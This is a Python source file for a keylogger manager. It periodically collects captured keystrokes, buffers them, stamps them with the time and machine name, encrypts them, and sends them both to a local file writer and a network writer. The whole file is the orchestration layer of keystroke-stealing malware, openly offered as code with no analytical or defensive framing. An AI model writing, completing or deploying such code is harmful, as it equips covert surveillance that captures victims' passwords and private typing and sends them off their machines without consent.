import threading
from typing import List, Optional
from datetime import datetime
from ikeylogger import IKeyLogger
from iwriter import IWriter
from encryptor import Encryptor
from config import Config


class KeyLoggerManager:
    def __init__(self, keylogger_service: IKeyLogger, file_writer: IWriter, network_writer: IWriter, encryptor: Encryptor):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.network_writer = network_writer
        self.encryptor = encryptor

        self.buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.timer: Optional[threading.Timer] = None
        self.update_interval = Config.UPDATE_INTERVAL
        self.machine_name = Config.MACHINE_NAME
        self.is_running_flag = False

    def start(self) -> None:
        if self.is_running_flag:
            print("KeyLoggerManager is already running")
            return
        self.is_running_flag = True
        self.keylogger_service.start_logging()
        self._schedule_collection()
        print(f"KeyLoggerManager started with interval {self.update_interval}s")

    def stop(self) -> None:
        if not self.is_running_flag:
            print("KeyLoggerManager is not running")
            return
        self.is_running_flag = False
        if self.timer:
            self.timer.cancel()
        self.keylogger_service.stop_logging()
        self._collect_and_process()
        print("KeyLoggerManager stopped")

    def _schedule_collection(self) -> None:
        if self.is_running_flag:
            self.timer = threading.Timer(self.update_interval, self._collect_and_process)
            self.timer.start()

    def _collect_and_process(self) -> None:
        try:
            keys = self.keylogger_service.get_logged_keys()
            if keys:
                with self.buffer_lock:
                    self.buffer.extend(keys)
                self._process_buffer()
        except Exception as e:
            print(f"Error during collection: {e}")
        finally:
            if self.is_running_flag:
                self._schedule_collection()

    def _process_buffer(self) -> None:
        try:
            with self.buffer_lock:
                if not self.buffer:
                    return
                raw_data = "".join(self.buffer)
                self.buffer.clear()

            data_with_timestamp = self._add_timestamp(raw_data)
            encrypted_data = self.encryptor.encrypt(data_with_timestamp)
            self._send_to_writers(encrypted_data)
            print(f"Processed {len(raw_data)} characters")
        except Exception as e:
            print(f"Error processing buffer: {e}")

    def _add_timestamp(self, data: str) -> str:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"

    def _send_to_writers(self, data: str) -> None:
        if self.file_writer:
            try:
                self.file_writer.send_data(data, self.machine_name)
            except Exception as e:
                print(f"Error sending to file_writer: {e}")
        if self.network_writer:
            try:
                self.network_writer.send_data(data, self.machine_name)
            except Exception as e:
                print(f"Error sending to network_writer: {e}")

    def get_buffer_size(self) -> int:
        with self.buffer_lock:
            return len(self.buffer)

    def force_flush(self) -> None:
        self._process_buffer()

    def update_interval_sec(self, new_interval: int) -> None:
        if new_interval <= 0:
            raise ValueError("Interval must be positive")
        self.update_interval = new_interval
        print(f"Update interval changed to {new_interval}s")
        if self.is_running_flag and self.timer:
            self.timer.cancel()
            self._schedule_collection()

    def is_running(self) -> bool:
        return self.is_running_flag
